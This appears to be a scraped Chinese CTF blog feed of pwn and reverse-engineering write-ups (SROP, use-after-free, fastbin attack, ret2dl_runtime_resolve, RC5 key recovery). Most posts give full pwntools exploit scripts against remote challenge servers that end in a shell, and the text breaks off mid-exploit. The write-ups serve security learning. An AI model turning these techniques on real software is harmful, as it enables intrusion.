show(index):sh.sendlineafter(&quot;4.show\n&quot;,&quot;4&quot;)sh.sendlineafter(&quot;index:\n&quot;,str(index))malloc(32,0xf8,&apos;32&apos;)malloc(1,0xf0,&apos;1&apos;)malloc(2,0x80,&apos;/bin/sh\x00&apos;)malloc(31,0x80,&apos;31&apos;)edit(32,p64(0)+p64(0xf1)+p64(heap+32*8-0x18)+p64(heap+32*8-0x10)+p64(0)*26+p64(0xf0))free(1)edit(32,p64(0)*2+p64(0x6020E0+32*8-8)+p64(elf.got[&apos;puts&apos;])+p64(0)*26+p32(1)+p32(0xffffffee))show(32)puts=u64(sh.recv(6).ljust(8,&apos;\x00&apos;))log.success(&quot;puts: &quot;+hex(puts))libc=LibcSearcher(&quot;puts&quot;,puts)libcbase=puts-libc.dump(&apos;puts&apos;)free_hook=libcbase+libc.dump(&apos;__free_hook&apos;)system=libcbase+libc.dump(&apos;system&apos;)edit(31,p64(free_hook))edit(31,p64(system))free(2)#gdb.attach(sh)sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ciscn_2019_es_7</title>
      <link href="/2019/08/02/ciscn-2019-es-7/"/>
      <url>/2019/08/02/ciscn-2019-es-7/</url>
      
        <content type="html"><![CDATA[<p>SROP，甚至比CTFWIKI上的例题简单。</p><a id="more"></a><h1 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">push    rbp</span><br><span class="line">mov     rbp, rsp</span><br><span class="line">xor     rax, rax</span><br><span class="line">mov     edx, 400h       ; count</span><br><span class="line">lea     rsi, [rsp+buf]  ; buf</span><br><span class="line">mov     rdi, rax        ; fd</span><br><span class="line">syscall                 ; LINUX - sys_read</span><br><span class="line">mov     rax, 1</span><br><span class="line">mov     edx, 30h        ; count</span><br><span class="line">lea     rsi, [rsp+buf]  ; buf</span><br><span class="line">mov     rdi, rax        ; fd</span><br><span class="line">syscall                 ; LINUX - sys_write</span><br><span class="line">retn</span><br></pre></td></tr></table></figure><p>调用syscall read&amp;write，之后直接retn。</p><p>同时给了两个gadget，方便修改rax为相应的系统调用号。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov     rax, 0Fh   //constants.SYS_sigreturn</span><br><span class="line">retn </span><br><span class="line">mov     rax, 3Bh  //constants.SYS_execve</span><br><span class="line">retn</span><br></pre></td></tr></table></figure><p>CTFWIKI上的例题只给了read调用，write调用还需要自己巧妙构造，这里直接可以leak出stack地址，然后就照着CTFWIKI上的脚本稍微改一改就行了。也可以直接手动找gadgets把参数传好，然后利用<code>mov     rax, 3Bh        syscall</code>执行execve(“/bin/sh”,0,0)，不过感觉找gadgets比上CTFWIKI麻烦2333</p><h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env pythonfrom pwn import *from LibcSearcher import *#sh=process(&quot;./ciscn_2019_es_7.dms&quot;)context.arch=&apos;amd64&apos;sh=remote(&quot;f.buuoj.cn&quot;,20179)syscall_ret=0x400517read=0x4004f1movrax_sigreturn=0x4004damovrax_system=0x4004E2sh.send(&quot;/bin/sh&quot;+&quot;\x00&quot;*9+p64(read))sh.recv(32)stack_addr=u64(sh.recv(8))log.success(&quot;stack: &quot;+hex(stack_addr))sh.recv(8)sigframe = SigreturnFrame()sigframe.rax = constants.SYS_execvesigframe.rdi = stack_addr - 280  # &quot;/bin/sh&quot; &apos;s addrsigframe.rsi = 0x0sigframe.rdx = 0x0sigframe.rsp = stack_addrsigframe.rip = syscall_retsh.send(&quot;/bin/sh&quot;+&quot;\x00&quot;*9+p64(movrax_sigreturn)+p64(syscall_ret)+str(sigframe))sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界-hacknote</title>
      <link href="/2019/08/01/hacknote/"/>
      <url>/2019/08/01/hacknote/</url>
      
        <content type="html"><![CDATA[<p>感觉BUU有些写不动又回来刷攻防世界的一些简单题了2333<br><a id="more"></a></p><h1 id="程序功能"><a href="#程序功能" class="headerlink" title="程序功能"></a>程序功能</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1. Add note          2. Delete note       3. Print note        4. Exit</span><br></pre></td></tr></table></figure><p>每次Add都会malloc(0x8)，其中fd用来存放一个自定义的puts函数，会打印出*bk，然后再malloc(输入的size)作为记录内容的chunk，将返回的地址存入bk。</p><h1 id="程序漏洞"><a href="#程序漏洞" class="headerlink" title="程序漏洞"></a>程序漏洞</h1><p>Delete后没有置零，存在UAF，Print时调用fd位置的函数。</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Add(0x10,&apos;0&apos;)</span><br><span class="line">Add(0x10,&apos;1&apos;)</span><br><span class="line">Del(0)</span><br><span class="line">Del(1)</span><br></pre></td></tr></table></figure><p>此时fastbin中会用两个单链表记录空闲的chunk，两个大小为0x10的chunk（malloc(0x8)时得到的chunk）会被记录在一个链表中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Add(0x8,p32(0x804862b)+p32(0x804A024))</span><br><span class="line">#0x804862b为自定义的puts函数的地址Print(0)leak=u32(sh.recv(4))log.success(&quot;puts: &quot;+hex(leak))puts=leaklibc=LibcSearcher(&apos;puts&apos;,puts)libcbase=leak-libc.dump(&apos;puts&apos;)</span><br></pre></td></tr></table></figure><p>再次Add(0x8)，此时得到的存放内容的chunk就是chunk0的malloc(0x8)的chunk，并且由于UAF，此时Print(0)还可以使用，修改chunk2的内容，改变chunk0的bk部分为puts_got，再Print(0)即可leak出libc地址。这里攻防世界给的libc好像给错了，自己找了一下libc才对得上。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Del(2)Add(0x8,p32(libcbase+libc.dump(&apos;system&apos;))+&quot;||sh&quot;)Print(0)sh.interactive()</span><br></pre></td></tr></table></figure><p>然后把chunk2删除再次申请，又可以再次修改chunk0。这次将函数指针改成system地址，Print(0)时即会执行system(fd)，但是fd上存放的就是system地址，这里学习了一手<code>||</code>。在bk位置写上’||sh’，执行的就是system(systemaddr||sh)，可以获取shell。</p><h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env pythonfrom pwn import *from LibcSearcher import *#sh=process(&quot;./hacknote.dms&quot;)libc2=ELF(&quot;./libc-2.23.so&quot;)#onegadget=[0x45216,0x4526a,0xf02a4,0xf1147]sh=remote(&apos;111.198.29.45&apos;,41371)def Add(size,content):sh.sendlineafter(&apos;choice :&apos;,&apos;1&apos;)sh.sendlineafter(&apos;size :&apos;,str(int(size)))sh.sendlineafter(&apos;Content :&apos;,content)def Del(Index):sh.sendlineafter(&apos;choice :&apos;,&apos;2&apos;)sh.sendlineafter(&apos;Index :&apos;,str(Index))def Print(Index):sh.sendlineafter(&apos;choice :&apos;,&apos;3&apos;)sh.sendlineafter(&apos;Index :&apos;,str(Index))Add(0x10,&apos;0&apos;)Add(0x10,&apos;1&apos;)Del(0)Del(1)Add(0x8,p32(0x804862b)+p32(0x804A024))Print(0)leak=u32(sh.recv(4))log.success(&quot;puts: &quot;+hex(leak))puts=leaklibc=LibcSearcher(&apos;puts&apos;,puts)libcbase=leak-libc.dump(&apos;puts&apos;)Del(2)Add(0x8,p32(libcbase+libc.dump(&apos;system&apos;))+&quot;||sh&quot;)Print(0)sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ciscn_2019_emachine</title>
      <link href="/2019/07/30/ciscn-2019-c-1/"/>
      <url>/2019/07/30/ciscn-2019-c-1/</url>
      
        <content type="html"><![CDATA[<p>说起来这题算是国赛过程中自己做的唯一一题2333，tcl</p><a id="more"></a><h1 id="程序功能"><a href="#程序功能" class="headerlink" title="程序功能"></a>程序功能</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.Encrypt</span><br><span class="line">2.Decrypt</span><br></pre></td></tr></table></figure><p>其实只有一个功能Encrypt，Decrypt需要自己手动操作。</p><h1 id="程序漏洞"><a href="#程序漏洞" class="headerlink" title="程序漏洞"></a>程序漏洞</h1><p>Encrypt中存在栈溢出</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>Encrypt会对输入进行加密，所以要让输入被加密后构成有效的ROP。</p><p>之前被加密过位置的就不会再被加密。例如第一次输入了a，加密后变成l，第二次输入aa，就只有第二个a会被加密，加密后变成al。</p><p>main函数地址为0x400b28，若输入为0x4e0b28，加密后恰好能变成main函数地址。用这个输入多填充几个地址，确保之后构造ROP时不会被加密。</p><p>比赛时没给libc，但差别不大，这次就按有libc来做了。</p><h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#coding=UTF-8from pwn import *sh=remote(&quot;buuoj.cn&quot;,20115)#sh=process(&apos;/media/psf/Home/Desktop/Challenges/BUUpwn/ciscn_2019_c_1.dms&apos;,env=&#123;&quot;LD_PRELOAD&quot;:&apos;./x64_libc.so.6&apos;&#125;)elf=ELF(&apos;/media/psf/Home/Desktop/Challenges/BUUpwn/ciscn_2019_c_1.dms&apos;)libc=ELF(&apos;./x64_libc.so.6&apos;)def send(content):sh.recvuntil(&quot;Input your choice!\n&quot;)sh.sendline(&quot;1&quot;)sh.recvuntil(&quot;Input your Plaintext to be encrypted\n&quot;)sh.sendline(content)main=0x400B28main_enc=0x4e0b28pop_rdi=0x400c83send(&apos;a&apos;*0x58+p64(main_enc)*10)send(&apos;a&apos;*0x58+p64(pop_rdi)+p64(elf.got[&apos;puts&apos;])+p64(elf.plt[&apos;puts&apos;])+p64(main))sh.recvuntil(&apos;@\n&apos;)leak=u64(sh.recv(6).ljust(8,&apos;\x00&apos;))libc_base=leak-libc.sym[&apos;puts&apos;]log.success(&quot;libcbase: &quot;+hex(libc_base))send(&apos;a&apos;*0x58+p64(pop_rdi)+p64(libc_base+0x18cd57)+p64(libc_base+libc.sym[&apos;system&apos;]))sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>babyheap_0ctf_2017</title>
      <link href="/2019/07/29/babyheap-0ctf-2017/"/>
      <url>/2019/07/29/babyheap-0ctf-2017/</url>
      
        <content type="html"><![CDATA[<p>回家之后这么热居然感冒了，在床上躺了一天Orz<br><a id="more"></a></p><h1 id="程序功能"><a href="#程序功能" class="headerlink" title="程序功能"></a>程序功能</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.alloc</span><br><span class="line">2.fill</span><br><span class="line">3.free</span><br><span class="line">4.dump</span><br></pre></td></tr></table></figure><p>在<code>alloc</code>时，程序会分配大小为24个字节的存储结构：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">inuse记录该chunk是否处于使用状态</span><br><span class="line">size记录该chunk大小</span><br><span class="line">*ptr记录alloc出的chunk的地址</span><br></pre></td></tr></table></figure><h1 id="程序漏洞"><a href="#程序漏洞" class="headerlink" title="程序漏洞"></a>程序漏洞</h1><p>在<code>fill</code>时，读入的<code>size</code>并非<code>alloc</code>记录的<code>size</code>，而是另外输入，因此产生了堆溢出。</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>申请四块chunk。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Add(0x10)Add(0x10)Add(0x80)Add(0x10)</span><br></pre></td></tr></table></figure><p>修改第二块<code>chunk</code>的<code>size</code>为<code>0x40</code>，并修改第三块<code>chunk</code>的<code>size</code>，标记上一块<code>chunk</code>处于使用状态。<code>Free</code>第二块<code>chunk</code>后申请大小为<code>0x30</code>的<code>chunk</code>，第三块<code>chunk</code>的<code>head</code>部分与<code>fd</code>，<code>bk</code>被包含进第二块<code>chunk</code>的<code>content</code>部分。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Fill(0,0x20,p64(0)*3+p64(0x41))Fill(2,0x20,p64(0)*3+p64(0x71))</span><br><span class="line">Free(1)Add(0x30）</span><br></pre></td></tr></table></figure><p><code>Free</code>第三块<code>chunk</code>，其<code>fd</code>，<code>bk</code>为<code>main_arena+88</code>，<code>dump</code>第二块<code>chunk</code>得到此地址，<code>leak</code>出<code>libc</code>基址。由于分配<code>chunk</code>时使用的是<code>calloc</code>，第三块<code>chunk</code>的<code>head</code>在第二次申请第二块<code>chunk</code>时被置零，需要先修复才能<code>Free</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Fill(1,0x20,p64(0)*3+p64(0x91))Free(2)Dump(1)</span><br><span class="line">Dump(1)sh.recvuntil(&apos;\x91&apos;+&apos;\x00&apos;*7)leak=u64(sh.recv(6).ljust(8,&apos;\x00&apos;))malloc_hook=leak-88-0x10print hex(malloc_hook)libc_base=leak-0x3C4B20-88one_gadget=libc_base+onegadget[1]fakefd=malloc_hook-0x23</span><br></pre></td></tr></table></figure><p>之后在<code>malloc_hook</code>上方错位构造大小为<code>0x7f</code>的<code>chunk</code>，通过<code>Fastbin attack</code>获取该<code>chunk</code>，修改<code>malloc_hook</code>。</p><h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#coding=UTF-8from pwn import *sh=remote(&quot;buuoj.cn&quot;,20001)#sh=process(&apos;/media/psf/Home/Desktop/Challenges/BUUpwn/babyheap_0ctf_2017.dms&apos;,env=&#123;&quot;LD_load&quot;:&apos;./x64_libc.so.6&apos;&#125;)libc=ELF(&quot;./x64_libc.so.6&quot;)onegadget=[0x45216,0x4526a,0xf02a4,0xf1147]def Add(Size):sh.recvuntil(&quot;Command: &quot;)sh.sendline(&quot;1&quot;)sh.recvuntil(&quot;Size: &quot;)sh.sendline(str(int(Size)))def Fill(Index,Size,Content):sh.recvuntil(&quot;Command: &quot;)sh.sendline(&quot;2&quot;)sh.recvuntil(&quot;Index: &quot;)sh.sendline(str(Index))sh.recvuntil(&quot;Size: &quot;)sh.sendline(str(int(Size)))sh.recvuntil(&quot;Content: &quot;)sh.send(Content)def Free(Index):sh.recvuntil(&quot;Command: &quot;)sh.sendline(&quot;3&quot;)sh.recvuntil(&quot;Index: &quot;)sh.sendline(str(Index))def Dump(Index):sh.recvuntil(&quot;Command: &quot;)sh.sendline(&quot;4&quot;)sh.recvuntil(&quot;Index: &quot;)sh.sendline(str(Index))Add(0x10)Add(0x10)Add(0x80)Add(0x10)Fill(0,0x20,p64(0)*3+p64(0x41))Fill(2,0x20,p64(0)*3+p64(0x71))Free(1)Add(0x30)Fill(1,0x20,p64(0)*3+p64(0x91))Free(2)Dump(1)sh.recvuntil(&apos;\x91&apos;+&apos;\x00&apos;*7)leak=u64(sh.recv(6).ljust(8,&apos;\x00&apos;))malloc_hook=leak-88-0x10print hex(malloc_hook)libc_base=leak-0x3C4B20-88one_gadget=libc_base+onegadget[1]fakefd=malloc_hook-0x23Add(0x60)Free(2)Fill(1,0x28,p64(0)*3+p64(0x71)+p64(fakefd))Add(0x60)Add(0x60)Fill(4,0x13+8,&apos;a&apos;*0x13+p64(one_gadget))Add(0x10)sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>安恒杯2019年5月月赛</title>
      <link href="/2019/05/30/%E5%AE%89%E6%81%92%E6%9D%AF2019%E5%B9%B45%E6%9C%88%E6%9C%88%E8%B5%9B/"/>
      <url>/2019/05/30/%E5%AE%89%E6%81%92%E6%9D%AF2019%E5%B9%B45%E6%9C%88%E6%9C%88%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<p>西湖论剑线下赛复现专场</p><a id="more"></a><h1 id="easycrack"><a href="#easycrack" class="headerlink" title="easycrack"></a>easycrack</h1><p>简单的替换，也可以在<code>strcmp</code>下断，调试得到flag。</p><h1 id="Testre2"><a href="#Testre2" class="headerlink" title="Testre2"></a>Testre2</h1><p>得到flag之后才知道是RC5，逆的过程中只觉得中间加密部分的逻辑和骑驴师傅出的考核题差不多2333</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    unsigned int key[26]=&#123;0&#125;;</span><br><span class="line">    key[0]=0xb7e15163;</span><br><span class="line">    for(int i=1;i&lt;26;i++)</span><br><span class="line">        key[i]=key[i-1]-0x61c88647;</span><br><span class="line">    unsigned int a1[4]=&#123;0x243F6A88,0x85A308D3,0x452821E6,0x38D01377&#125;;</span><br><span class="line">    unsigned int v5=0,v6=0,v7=0;</span><br><span class="line">    for(int i=0;i&lt;78;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        key[i%26]=( (key[i%26]+v5+v6)&lt;&lt;(3&amp;0x1f) ) | ( (key[i%26]+v5+v6)&gt;&gt;(32-(3&amp;0x1f)) );</span><br><span class="line">        v5=key[i%26];</span><br><span class="line">        a1[i&amp;3]=( (a1[i&amp;3]+v5+v6)&lt;&lt;((v5+v6)&amp;0x1f) ) | ( (a1[i&amp;3]+v5+v6)&gt;&gt;(32-((v5+v6)&amp;0x1f)) );</span><br><span class="line">        v6=a1[i&amp;3];</span><br><span class="line">    &#125;</span><br><span class="line">    unsigned int final[4]=&#123;0xF4A956BF,0xBA568F3D,0xD73A7F7C,0x817F532B&#125;;</span><br><span class="line">    //unsigned int final[4]=&#123;0X6EA91D54,0X7C5153BA,0X339AABC3,0X6672A3A9&#125;;</span><br><span class="line">    unsigned int input[4]=&#123;0x30303030,0x30303030,0x30303030,0x30303030&#125;;</span><br><span class="line">    </span><br><span class="line">    //encrypt</span><br><span class="line">    /*for(int j=0;j&lt;=3;j+=2)</span><br><span class="line">    &#123;</span><br><span class="line">        v6=key[0]+input[j];</span><br><span class="line">        v7=key[1]+input[j+1];</span><br><span class="line">        for(int k=0;k&lt;=11;++k)</span><br><span class="line">        &#123;</span><br><span class="line">            v6=(( (v6^v7 )&lt;&lt;(v7&amp;0x1f) ) | ( (v6^v7 )&gt;&gt;(32-(v7&amp;0x1f)) )  )+key[2*j];</span><br><span class="line">            v7=(( (v6^v7 )&lt;&lt;(v6&amp;0x1f) ) | ( (v6^v7 )&gt;&gt;(32-(v6&amp;0x1f)) )  )+key[2*j+1];</span><br><span class="line">        &#125;</span><br><span class="line">        input[j]=v6;</span><br><span class="line">        input[j+1]=v7;</span><br><span class="line">    &#125;*/</span><br><span class="line">    </span><br><span class="line">    //decrypt</span><br><span class="line">    for(int j=0;j&lt;=3;j+=2)</span><br><span class="line">    &#123;</span><br><span class="line">        v6=final[j];</span><br><span class="line">        v7=final[j+1];</span><br><span class="line">        for(int k=0;k&lt;=11;++k)</span><br><span class="line">        &#123;</span><br><span class="line">            v7=( ( ( ((v7-key[2*j+1])&gt;&gt;(v6&amp;0x1f) ) ) |( (v7-key[2*j+1])&lt;&lt; (32-(v6&amp;0x1f) ) ) ) )^v6;</span><br><span class="line">            v6=( ( ( ((v6-key[2*j])&gt;&gt;(v7&amp;0x1f) ) ) |( (v6-key[2*j])&lt;&lt; (32-(v7&amp;0x1f) ) ) ) )^v7;</span><br><span class="line">        &#125;</span><br><span class="line">        input[j]=v6-key[0];</span><br><span class="line">        input[j+1]=v7-key[1];</span><br><span class="line">    &#125;</span><br><span class="line">    unsigned char flag[16]=&#123;0&#125;;</span><br><span class="line">    memcpy(flag,input,16);</span><br><span class="line">    for(int i=0;i&lt;16;i++)</span><br><span class="line">        printf(&quot;%c&quot;,flag[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要注意的就是运算符的优先级，我记得不是很清楚，所以只能为了运算顺序正确，使用了大量括号orz</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ISCC2019-pwn01</title>
      <link href="/2019/05/19/ISCC2019-pwn01/"/>
      <url>/2019/05/19/ISCC2019-pwn01/</url>
      
        <content type="html"><![CDATA[<p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop/#ret2_dl_runtime_resolve" target="_blank" rel="noopener">ret2-dl-runtime-resolve</a></p><a id="more"></a><h1 id="简单分析"><a href="#简单分析" class="headerlink" title="简单分析"></a>简单分析</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char dest; // [esp+0h] [ebp-16h]</span><br><span class="line">  size_t n; // [esp+Ah] [ebp-Ch]</span><br><span class="line">  int *v6; // [esp+Eh] [ebp-8h]</span><br><span class="line"></span><br><span class="line">  v6 = &amp;argc;</span><br><span class="line">  n = read(0, &amp;buf, 0xF4240u);</span><br><span class="line">  memcpy(&amp;dest, &amp;buf, n);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>是很标准的ret2-dl-runtime-resolve例题了，需要注意的是需要看汇编：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:080484AE                 lea     esp, [ebp-8]</span><br><span class="line">.text:080484B1                 pop     ecx</span><br><span class="line">.text:080484B2                 pop     ebx</span><br><span class="line">.text:080484B3                 pop     ebp</span><br><span class="line">.text:080484B4                 lea     esp, [ecx-4]</span><br><span class="line">.text:080484B7                 retn</span><br></pre></td></tr></table></figure><p>函数结尾处的汇编是这样的，意味着不能简单地填充溢出，和之前那道DDCTF的pwn一样，需要在特定位置输入正确的值才可以。</p><p>不过这一题不一样的是，我们可以直接控制ebp,esp到buf上，然后buf上的数据是受我们输入控制的，再配合一些gadgets就可以完成调用read函数并且换栈。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh.send(&apos;aabbbbccccdddd&apos;+p32(buf+30)+p32(0)+p32(buf+26)+p32(read_plt)+p32(ppp_ret)+p32(0)+p32(stage)+p32(100)+p32(pop_ret)+p32(stage)+p32(leave_ret))</span><br></pre></td></tr></table></figure><p>像这样就可以把栈换到stage处，接下来就是标准的ret2-dl-runtime-resolve，详细地原理介绍看CTF-WIKI就可以了。</p><h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># coding=UTF-8from pwn import *#sh=process(&quot;./pwn01.dms&quot;)sh=remote(&quot;39.100.87.24&quot;,8101)elf=ELF(&apos;./pwn01.dms&apos;)bss=elf.bss()read_plt=elf.plt[&apos;read&apos;]buf=bss+0x20stage=buf+0x282#stage=buf+28pop_ret=0x0804851bppp_ret=0x08048519leave_ret=0x080483c5#gdb.attach(sh)sh.send(&apos;aabbbbccccdddd&apos;+p32(buf+30)+p32(0)+p32(buf+26)+p32(read_plt)+p32(ppp_ret)+p32(0)+p32(stage)+p32(100)+p32(pop_ret)+p32(stage)+p32(leave_ret))#sh.send(&apos;aabbbbccccdddd&apos;+p32(buf+32)+p32(0)+p32(buf+28)+&apos;aa&apos;+payload2)plt0 = elf.get_section_by_name(&apos;.plt&apos;).header.sh_addrrel_plt = elf.get_section_by_name(&apos;.rel.plt&apos;).header.sh_addrdynsym = elf.get_section_by_name(&apos;.dynsym&apos;).header.sh_addrdynstr = elf.get_section_by_name(&apos;.dynstr&apos;).header.sh_addrindex_offset = stage + 28 - rel_pltread_got = elf.got[&apos;read&apos;]read_index = (elf.plt[&apos;read&apos;] - plt0) / 16 - 1read_index *= 8r_offset=0x0804a00cfake_sym_addr = stage + 36align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)fake_sym_addr = fake_sym_addr + alignindex_dynsym = (fake_sym_addr - dynsym) / 0x10  st_name = fake_sym_addr + 0x10 - dynstrfake_write_sym = flat([st_name, 0, 0, 0x12])r_info = (index_dynsym &lt;&lt; 8) | 0x7fake_write_reloc = flat([read_got, r_info])payload=&apos;aaaa&apos;+p32(plt0)+p32(index_offset)+&apos;aaaa&apos;+p32(stage+84)+&apos;aaaa&apos;+&apos;aaaa&apos;+fake_write_reloc+&apos;a&apos;*align+fake_write_sym+&apos;system\x00&apos;payload+=&apos;a&apos;*(84-len(payload))payload+=&apos;sh\x00&apos;sh.send(payload)#sh.send(payload2)sh.interactive()</span><br></pre></td></tr></table></figure><p>基本照抄CTF-WIKI，有的偏移和CTF-WIKI不一样，是因为换栈的方式不一样，我的EXP在第二次使用read函数时，开头四个字符需要输入一个填充，来让<code>leave,ret</code>中<code>pop,ebp</code>时pop，这样后面所有的伪造的结构的地址都要+4。</p><p>这题写了很久很久……主要是因为卡在了换栈的位置选择，我之前一直选择bss+400的位置，结果在调用dl_fixup时一直会报错，以为是换栈之类的出了问题，试了很久都不知道为啥，最终要感谢看雪论坛师傅mengllong的评论解救了我：</p><p><img src="http://ww3.sinaimg.cn/large/006tNc79gy1g36zvw2go6j31iy07swgk.jpg" alt></p><p>最后尝试了一下，至少要在bss+0x2a2的位置才不会出错2333</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>DDCTF2019-pwn</title>
      <link href="/2019/05/16/DDCTF2019-pwn/"/>
      <url>/2019/05/16/DDCTF2019-pwn/</url>
      
        <content type="html"><![CDATA[<p>自己补一下栈</p><a id="more"></a><h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *sh=process(&quot;./xpwn&quot;)libc=ELF(&quot;./libc.so.6&quot;)sh.recvuntil(&apos;Enter username: &apos;)sh.send(&apos;a&apos;*4*15)sh.recvuntil(&apos;a&apos;*4*15)setbuf=u32(sh.recv(4))sh.recv(8)ebp=u32(sh.recv(4))libcbase=setbuf-libc.symbols[&apos;setbuf&apos;]print hex(libcbase)sh.recvuntil(&apos;Please set the length of password: &apos;)sh.sendline(&apos;-1&apos;)sh.recvuntil(&apos;Enter password(lenth 4294967295): 